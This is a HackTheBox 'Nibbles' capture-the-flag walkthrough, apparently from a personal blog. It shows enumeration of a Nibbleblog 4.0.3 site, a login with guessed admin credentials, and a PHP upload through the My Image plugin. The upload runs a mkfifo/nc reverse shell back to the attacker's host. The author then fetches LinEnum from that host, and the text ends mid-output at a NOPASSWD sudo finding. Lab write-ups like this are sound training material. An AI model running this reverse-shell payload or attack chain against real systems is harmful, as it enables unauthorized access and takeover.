---
title: "HackTheBox Nibbles Walkthrough"
date: "2023-01-08"
draft: "false"
---
# Nibbles

IP address : `10.10.10.75`

Nmap result

```jsx
$ nmap -sV -sT -sC 10.10.10.75
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-17 05:59 EST
Nmap scan report for 10.10.10.75
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4f8ade8f80477decf150d630a187e49 (RSA)
|   256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA)
|_  256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.73 seconds
```

Whatweb result

```jsx
$ whatweb 10.10.10.75
http://10.10.10.75 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.75]
```

![VirtualBox_kali-linux-2022.png](Nibbles%20ee94e40da7fd4e32b92833c03f346b63/VirtualBox_kali-linux-2022.png)

Intersting  /nibbleblog directory

In [`http://10.10.10.75/nibbleblog/`](http://10.10.10.75/nibbleblog/)

I see it was blog

```jsx
$ whatweb http://10.10.10.75/nibbleblog/
http://10.10.10.75/nibbleblog/ [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.75], JQuery, MetaGenerator[Nibbleblog], PoweredBy[Nibbleblog], Script, Title[Nibbles - Yum yum]
```

Searchsploit result

```jsx
$ searchsploit nibble       
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Nibbleblog 3 - Multiple SQL Injections                                                                                                                                                                    | php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                                                                                                                                                     | php/remote/38489.rb
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

gobuster result

```jsx
$ gobuster dir -u http://10.10.10.75/nibbleblog/ -w /usr/share/dirb/wordlists/common.txt 
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.75/nibbleblog/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2022/12/17 06:09:15 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 301]
/.htaccess            (Status: 403) [Size: 306]
/.htpasswd            (Status: 403) [Size: 306]
/admin                (Status: 301) [Size: 321] [--> http://10.10.10.75/nibbleblog/admin/]
/admin.php            (Status: 200) [Size: 1401]
/content              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/content/]
/index.php            (Status: 200) [Size: 2987]
/languages            (Status: 301) [Size: 325] [--> http://10.10.10.75/nibbleblog/languages/]
/plugins              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/plugins/]
/README               (Status: 200) [Size: 4628]
/themes               (Status: 301) [Size: 322] [--> http://10.10.10.75/nibbleblog/themes/]
Progress: 4577 / 4615 (99.18%)===============================================================
2022/12/17 06:10:05 Finished
===============================================================
```

curl README

```jsx
$ curl http://10.10.10.75/nibbleblog/README
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01

Site: http://www.nibbleblog.com
Blog: http://blog.nibbleblog.com
Help & Support: http://forum.nibbleblog.com
Documentation: http://docs.nibbleblog.com

===== Social =====
* Twitter: http://twitter.com/nibbleblog
* Facebook: http://www.facebook.com/nibbleblog
* Google+: http://google.com/+nibbleblog

===== System Requirements =====
* PHP v5.2 or higher
* PHP module - DOM
* PHP module - SimpleXML
* PHP module - GD
* Directory “content” writable by Apache/PHP

Optionals requirements

* PHP module - Mcrypt

===== Installation guide =====
1- Download the last version from http://nibbleblog.com
2- Unzip the downloaded file
3- Upload all files to your hosting or local server via FTP, Shell, Cpanel, others.
4- With your browser, go to the URL of your web. Example: www.domain-name.com
5- Complete the form
6- Done! you have installed Nibbleblog

===== About the author =====
Name: Diego Najar
E-mail: dignajar@gmail.com
Linkedin: http://www.linkedin.com/in/dignajar

===== Example Post =====
<h1>Lorem ipsum dolor sit amet</h1>
<p>ea tibique disputando qui. Utroque laboramus percipitur sea id, no oporteat constituto mea? Dico iracundia mnesarchum cum an, cu vidit albucius prodesset his. Facer primis essent ut quo, ea vivendo legendos assueverit vel, ne sed nonumes percipitur? No usu agam volutpat!</p>
<h2>An mutat docendi quo</h2>
<p>nusquam apeirian constituam ius cu? Et mel eripuit noluisse scriptorem, habeo dissentiet te qui, at veniam impedit deterruisset eam. Ne mollis aliquam sea, te vis tation inimicus ullamcorper, cum illum invenire id? Nam causae euripidis necessitatibus ex. Case ferri graece at vix. Usu platonem mediocritatem id, ullum salutatus at sed.</p>
<ol>
<li><strong>Graecis explicari vim cu</strong>. Vim simul tibique in, bonorum officiis maluisset eam an? Ut senserit argumentum pri, mei ut unum tollit labores. Mea tation nusquam detracto et. Ius quis disputationi an!</li>
<li><strong>Cu ignota inermis pri</strong>. Percipit sadipscing eu has. Ipsum laoreet suscipiantur nam in, ius probo rebum explicari cu. Doming aliquam tractatos usu in, sea tation feugiat adversarium te, at modus virtute antiopam per. Sit at ipsum atqui viderer, te vim dolores volutpat constituam.</li>
</ol>
<p>Eum malorum appellantur in, qui ad contentiones consequuntur interpretaris. Cu aeque gloriatur scriptorem vim! Fugit admodum sed ne? Natum scripta intellegebat sit ut, aeque forensibus ei eam. Mazim delicata ius id, usu at idque delicata perpetua. Mollis vidisse reprimique te has, oblique graecis voluptaria vis in. Sed ea aliquam indoctum, duo at hinc mucius, ex iudicabit consulatu mel.</p>
<p>Eu nisl debet convenire nam, et epicurei periculis democritum est, nam eu stet elitr oratio. Eam iriure virtute equidem in, ei summo officiis dignissim nec! Et nam soleat fuisset, doming fastidii voluptatum ea ius, errem volutpat cum eu! Ex detracto assueverit cum. An eos graeco utamur, veri audire his no. Possit dissentias ei mei, quidam efficiantur delicatissimi est id, vel iuvaret adipisci mnesarchum id.</p>
<pre>git clone [git-repo-url] nibbleblog<br />cd nibbleblog<br />npm i -d<br />mkdir -p public/files/{md,html,pdf}</pre>
<p>An mutat docendi quo, nusquam apeirian constituam ius cu? Et mel eripuit noluisse scriptorem, habeo dissentiet te qui, at veniam impedit deterruisset eam. Ne mollis aliquam sea, te vis tation inimicus ullamcorper, cum illum invenire id? Nam causae euripidis necessitatibus ex. Case ferri graece at vix. Usu platonem mediocritatem id, ullum salutatus at sed.</p>
<p>Graecis explicari vim cu. Vim simul tibique in, bonorum officiis maluisset eam an? Ut senserit argumentum pri, mei ut unum tollit labores. Mea tation nusquam detracto et. Ius quis disputationi an!</p>
<pre><code data-language="php">&lt;?php
        echo "Hello Nibbleblog";
        $tmp = array(1,2,3);
        foreach($tmp as $number)
                echo $number;
?&gt;</code></pre>
<h2>How to install Git</h2>
<p>An mutat docendi quo, nusquam apeirian constituam ius cu? Et mel eripuit noluisse scriptorem, habeo dissentiet te qui, at veniam impedit deterruisset eam. Ne mollis aliquam sea, te vis tation inimicus ullamcorper, cum illum invenire id? Nam causae euripidis necessitatibus ex. Case ferri graece at vix. Usu platonem mediocritatem id, ullum salutatus at sed.</p>
<pre class="nb-console">sudo yum install git</pre>
<p>An mutat docendi quo, nusquam apeirian constituam ius cu? Et mel eripuit noluisse scriptorem, habeo dissentiet te qui, at veniam impedit deterruisset eam. Ne mollis aliquam sea, te vis tation inimicus ullamcorper.</p>
```

Admin panel

![VirtualBox_kali-linux-2022.png](Nibbles%20ee94e40da7fd4e32b92833c03f346b63/VirtualBox_kali-linux-2022%201.png)

Themes

![VirtualBox_kali-linux-2022.png](Nibbles%20ee94e40da7fd4e32b92833c03f346b63/VirtualBox_kali-linux-2022%202.png)

Content

![VirtualBox_kali-linux-2022.png](Nibbles%20ee94e40da7fd4e32b92833c03f346b63/VirtualBox_kali-linux-2022%203.png)

Private

![VirtualBox_kali-linux-2022.png](Nibbles%20ee94e40da7fd4e32b92833c03f346b63/VirtualBox_kali-linux-2022%204.png)

```jsx
$ curl http://10.10.10.75/nibbleblog/content/private/users.xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<users><user username="admin"><id type="integer">0</id><session_fail_count type="integer">0</session_fail_count><session_date type="integer">1514544131</session_date></user><blacklist type="string" ip="10.10.10.1"><date type="integer">1512964659</date><fail_count type="integer">1</fail_count></blacklist></users>
```

```jsx
$ curl http://10.10.10.75/nibbleblog/content/private/config.xml
<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<config><name type="string">Nibbles</name><slogan type="string">Yum yum</slogan><footer type="string">Powered by Nibbleblog</footer><advanced_post_options type="integer">0</advanced_post_options><url type="string">http://10.10.10.134/nibbleblog/</url><path type="string">/nibbleblog/</path><items_rss type="integer">4</items_rss><items_page type="integer">6</items_page><language type="string">en_US</language><timezone type="string">UTC</timezone><timestamp_format type="string">%d %B, %Y</timestamp_format><locale type="string">en_US</locale><img_resize type="integer">1</img_resize><img_resize_width type="integer">1000</img_resize_width><img_resize_height type="integer">600</img_resize_height><img_resize_quality type="integer">100</img_resize_quality><img_resize_option type="string">auto</img_resize_option><img_thumbnail type="integer">1</img_thumbnail><img_thumbnail_width type="integer">190</img_thumbnail_width><img_thumbnail_height type="integer">190</img_thumbnail_height><img_thumbnail_quality type="integer">100</img_thumbnail_quality><img_thumbnail_option type="string">landscape</img_thumbnail_option><theme type="string">simpler</theme><notification_comments type="integer">1</notification_comments><notification_session_fail type="integer">0</notification_session_fail><notification_session_start type="integer">0</notification_session_start><notification_email_to type="string">admin@nibbles.com</notification_email_to><notification_email_from type="string">noreply@10.10.10.134</notification_email_from><seo_site_title type="string">Nibbles - Yum yum</seo_site_title><seo_site_description type="string"/><seo_keywords type="string"/><seo_robots type="string"/><seo_google_code type="string"/><seo_bing_code type="string"/><seo_author type="string"/><friendly_urls type="integer">0</friendly_urls><default_homepage type="integer">0</default_homepage></config>
```

And I sign in admin/nibbles (ha?)

![VirtualBox_kali-linux-2022.png](Nibbles%20ee94e40da7fd4e32b92833c03f346b63/VirtualBox_kali-linux-2022%205.png)

I see…

I create shell and upload on My image plugin

```jsx
$ cat nebbleshell.php 
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 9443 >/tmp/f"); ?>
```

And listing nc

```jsx
$ nc -lvnp 9443                      
listening on [any] 9443 ...
```

And access [`http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php`](http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php)

I got shell

```jsx
$ nc -lvnp 9443                      
listening on [any] 9443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.75] 51464
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
$
```

For more speed, so I spawn bash with python

```jsx
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Get user flag

```jsx
nibbler@Nibbles:/home/nibbler$ cat user.txt
cat user.txt
```

unzip

```jsx
nibbler@Nibbles:/home/nibbler$ unzip personal.zip
unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh
```

```jsx
nibbler@Nibbles:/home/nibbler$ cat personal/stuff/monitor.sh
cat personal/stuff/monitor.sh
                  ####################################################################################################
                  #                                        Tecmint_monitor.sh                                        #
                  # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #
                  # If any bug, report us in the link below                                                          #
                  # Free to use/edit/distribute the code below by                                                    #
                  # giving proper credit to Tecmint.com and Author                                                   #
                  #                                                                                                  #
                  ####################################################################################################
#! /bin/bash
# unset any variable which system may be using

# clear the screen
clear

unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

while getopts iv name
do
        case $name in
          i)iopt=1;;
          v)vopt=1;;
          *)echo "Invalid arg";;
        esac
done

if [[ ! -z $iopt ]]
then
{
wd=$(pwd)
basename "$(test -L "$0" && readlink "$0" || echo "$0")" > /tmp/scriptname
scriptname=$(echo -e -n $wd/ && cat /tmp/scriptname)
su -c "cp $scriptname /usr/bin/monitor" root && echo "Congratulations! Script Installed, now run monitor Command" || echo "Installation failed"
}
fi

if [[ ! -z $vopt ]]
then
{
echo -e "tecmint_monitor version 0.1\nDesigned by Tecmint.com\nReleased Under Apache 2.0 License"
}
fi

if [[ $# -eq 0 ]]
then
{

# Define Variable tecreset
tecreset=$(tput sgr0)

# Check if connected to Internet or not
ping -c 1 google.com &> /dev/null && echo -e '\E[32m'"Internet: $tecreset Connected" || echo -e '\E[32m'"Internet: $tecreset Disconnected"

# Check OS Type
os=$(uname -o)
echo -e '\E[32m'"Operating System Type :" $tecreset $os

# Check OS Release Version and Name
cat /etc/os-release | grep 'NAME\|VERSION' | grep -v 'VERSION_ID' | grep -v 'PRETTY_NAME' > /tmp/osrelease
echo -n -e '\E[32m'"OS Name :" $tecreset  && cat /tmp/osrelease | grep -v "VERSION" | cut -f2 -d\"
echo -n -e '\E[32m'"OS Version :" $tecreset && cat /tmp/osrelease | grep -v "NAME" | cut -f2 -d\"

# Check Architecture
architecture=$(uname -m)
echo -e '\E[32m'"Architecture :" $tecreset $architecture

# Check Kernel Release
kernelrelease=$(uname -r)
echo -e '\E[32m'"Kernel Release :" $tecreset $kernelrelease

# Check hostname
echo -e '\E[32m'"Hostname :" $tecreset $HOSTNAME

# Check Internal IP
internalip=$(hostname -I)
echo -e '\E[32m'"Internal IP :" $tecreset $internalip

# Check External IP
externalip=$(curl -s ipecho.net/plain;echo)
echo -e '\E[32m'"External IP : $tecreset "$externalip

# Check DNS
nameservers=$(cat /etc/resolv.conf | sed '1 d' | awk '{print $2}')
echo -e '\E[32m'"Name Servers :" $tecreset $nameservers 

# Check Logged In Users
who>/tmp/who
echo -e '\E[32m'"Logged In users :" $tecreset && cat /tmp/who 

# Check RAM and SWAP Usages
free -h | grep -v + > /tmp/ramcache
echo -e '\E[32m'"Ram Usages :" $tecreset
cat /tmp/ramcache | grep -v "Swap"
echo -e '\E[32m'"Swap Usages :" $tecreset
cat /tmp/ramcache | grep -v "Mem"

# Check Disk Usages
df -h| grep 'Filesystem\|/dev/sda*' > /tmp/diskusage
echo -e '\E[32m'"Disk Usages :" $tecreset 
cat /tmp/diskusage

# Check Load Average
loadaverage=$(top -n 1 -b | grep "load average:" | awk '{print $10 $11 $12}')
echo -e '\E[32m'"Load Average :" $tecreset $loadaverage

# Check System Uptime
tecuptime=$(uptime | awk '{print $3,$4}' | cut -f1 -d,)
echo -e '\E[32m'"System Uptime Days/(HH:MM) :" $tecreset $tecuptime

# Unset Variables
unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

# Remove Temporary Files
rm /tmp/osrelease /tmp/who /tmp/ramcache /tmp/diskusage
}
fi
shift $(($OPTIND -1))
```

Get linenums and serves

```jsx
$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh                            
--2022-12-17 06:46:53--  https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/plain]
Saving to: ‘LinEnum.sh’

LinEnum.sh                                                 100%[========================================================================================================================================>]  45.54K  --.-KB/s    in 0.001s  

2022-12-17 06:46:53 (32.0 MB/s) - ‘LinEnum.sh’ saved [46631/46631]

                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/tmp]
└─$ sudo python3 -m http.server 8080    
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Wget

```jsx
nibbler@Nibbles:/home/nibbler$ wget http://10.10.14.3:8080/LinEnum.sh
wget http://10.10.14.3:8080/LinEnum.sh
--2022-12-17 06:50:18--  http://10.10.14.3:8080/LinEnum.sh
Connecting to 10.10.14.3:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
Saving to: 'LinEnum.sh'

LinEnum.sh          100%[===================>]  45.54K   215KB/s    in 0.2s    

2022-12-17 06:50:18 (215 KB/s) - 'LinEnum.sh' saved [46631/46631]

nibbler@Nibbles:/home/nibbler$
```

Exec linenum.sh

```jsx
$ chmod u+x ./LinEnum.sh
chmod u+x ./LinEnum.sh
```

Scan Result

```jsx
nibbler@Nibbles:/home/nibbler$ ./LinEnum.sh
./LinEnum.sh

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.982

[-] Debug Info
[+] Thorough tests = Disabled

Scan started at:
Sat Dec 17 06:51:51 EST 2022                                                                                                                                                                                                                
                                                                                                                                                                                                                                            

### SYSTEM ##############################################
[-] Kernel information:
Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux

[-] Kernel information (continued):
Linux version 4.4.0-104-generic (buildd@lgw01-amd64-022) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.5) ) #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017

[-] Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.3 LTS"
NAME="Ubuntu"
VERSION="16.04.3 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.3 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial

[-] Hostname:
Nibbles

### USER/GROUP ##########################################
[-] Current user/group info:
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)

[-] Users that have previously logged onto the system:
Username         Port     From             Latest
root             tty1                      Tue Dec 15 05:00:11 -0500 2020

[-] Who else is logged on:
 06:51:51 up 53 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

[-] Group memberships:
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=107(messagebus) gid=111(messagebus) groups=111(messagebus)
uid=108(uuidd) gid=112(uuidd) groups=112(uuidd)
uid=109(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=111(mysql) gid=118(mysql) groups=118(mysql)
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)

[-] It looks like we have some admin users:
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)

[-] Contents of /etc/passwd:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:111:118:MySQL Server,,,:/nonexistent:/bin/false
nibbler:x:1001:1001::/home/nibbler:

[-] Super user account(s):
root

[+] We can sudo without supplying a password!
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh

[+] Possible sudo pwnage!
/home/nibbler/personal/stuff/monitor.sh

[-] Are permissions on /home directories lax:
total 12K
drwxr-xr-x  3 root    root    4.0K Dec 10  2017 .
drwxr-xr-x 23 root    root    4.0K Dec 15  2020 ..
drwxr-xr-x  4 nibbler nibbler 4.0K Dec 17 06:50 nibbler

[-] Root is allowed to login via SSH:
PermitRootLogin yes

### ENVIRONMENTAL #######################################
[-] Environment information:
APACHE_PID_FILE=/var/run/apache2/apache2.pid
APACHE_RUN_USER=nibbler
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
APACHE_LOG_DIR=/var/log/apache2
PWD=/home/nibbler
LANG=C
APACHE_RUN_GROUP=nibbler
SHLVL=2
APACHE_RUN_DIR=/var/run/apache2
APACHE_LOCK_DIR=/var/lock/apache2
_=/usr/bin/env

[-] Path information:
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
drwxr-xr-x 2 root root 12288 Dec 28  2017 /bin
drwxr-xr-x 2 root root 12288 Dec 28  2017 /sbin
drwxr-xr-x 2 root root 28672 Dec 28  2017 /usr/bin
drwxr-xr-x 2 root root  4096 Jul 19  2016 /usr/local/bin
drwxr-xr-x 2 root root  4096 Jul 19  2016 /usr/local/sbin
drwxr-xr-x 2 root root 12288 Dec 28  2017 /usr/sbin

[-] Available shells:
# /etc/shells: valid login shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash
/usr/bin/tmux
/usr/bin/screen

[-] Current umask value:
0022
u=rwx,g=rx,o=rx

[-] umask value as specified in /etc/login.defs:
UMASK           022

[-] Password and storage information:
PASS_MAX_DAYS   99999
PASS_MIN_DAYS   0
PASS_WARN_AGE   7
ENCRYPT_METHOD SHA512

### JOBS/TASKS ##########################################
[-] Cron jobs:
-rw-r--r-- 1 root root  722 Apr  5  2016 /etc/crontab

/etc/cron.d:
total 24
drwxr-xr-x  2 root root 4096 Dec 28  2017 .
drwxr-xr-x 92 root root 4096 Mar 24  2021 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rw-r--r--  1 root root  589 Jul 16  2014 mdadm
-rw-r--r--  1 root root  712 Sep  5  2017 php
-rw-r--r--  1 root root  191 Sep 22  2017 popularity-contest

/etc/cron.daily:
total 60
drwxr-xr-x  2 root root 4096 Dec 28  2017 .
drwxr-xr-x 92 root root 4096 Mar 24  2021 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root  539 Apr  5  2016 apache2
-rwxr-xr-x  1 root root  376 Mar 31  2016 apport
-rwxr-xr-x  1 root root 1474 Jun 19  2017 apt-compat
-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils
-rwxr-xr-x  1 root root 1597 Nov 26  2015 dpkg
-rwxr-xr-x  1 root root  372 May  6  2015 logrotate
-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  539 Jul 16  2014 mdadm
-rwxr-xr-x  1 root root  435 Nov 18  2014 mlocate
-rwxr-xr-x  1 root root  249 Nov 12  2015 passwd
-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest
-rwxr-xr-x  1 root root  214 May 24  2016 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Sep 22  2017 .
drwxr-xr-x 92 root root 4096 Mar 24  2021 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Sep 22  2017 .
drwxr-xr-x 92 root root 4096 Mar 24  2021 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.weekly:
total 24
drwxr-xr-x  2 root root 4096 Sep 22  2017 .
drwxr-xr-x 92 root root 4096 Mar 24  2021 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root   86 Apr 13  2016 fstrim
-rwxr-xr-x  1 root root  771 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  211 May 24  2016 update-notifier-common

[-] Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#

[-] Systemd timers:
NEXT                         LEFT          LAST                         PASSED    UNIT                         ACTIVATES
Sat 2022-12-17 06:59:36 EST  7min left     Sat 2022-12-17 05:58:21 EST  53min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Sat 2022-12-17 07:09:00 EST  17min left    Sat 2022-12-17 06:39:01 EST  12min ago phpsessionclean.timer        phpsessionclean.service
Sat 2022-12-17 11:20:37 EST  4h 28min left Sat 2022-12-17 05:58:18 EST  53min ago snapd.refresh.timer          snapd.refresh.service
Sat 2022-12-17 17:29:38 EST  10h left      Sat 2022-12-17 05:58:21 EST  53min ago apt-daily.timer              apt-daily.service
Sun 2022-12-18 06:13:29 EST  23h left      Sat 2022-12-17 06:13:29 EST  38min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service

5 timers listed.
Enable thorough tests to see inactive timers

### NETWORKING  ##########################################
[-] Network and IP info:
ens192    Link encap:Ethernet  HWaddr 00:50:56:b9:8e:75  
          inet addr:10.10.10.75  Bcast:10.10.10.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:feb9:8e75/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:7544 errors:0 dropped:93 overruns:0 frame:0
          TX packets:8316 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:1121213 (1.1 MB)  TX bytes:3227316 (3.2 MB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
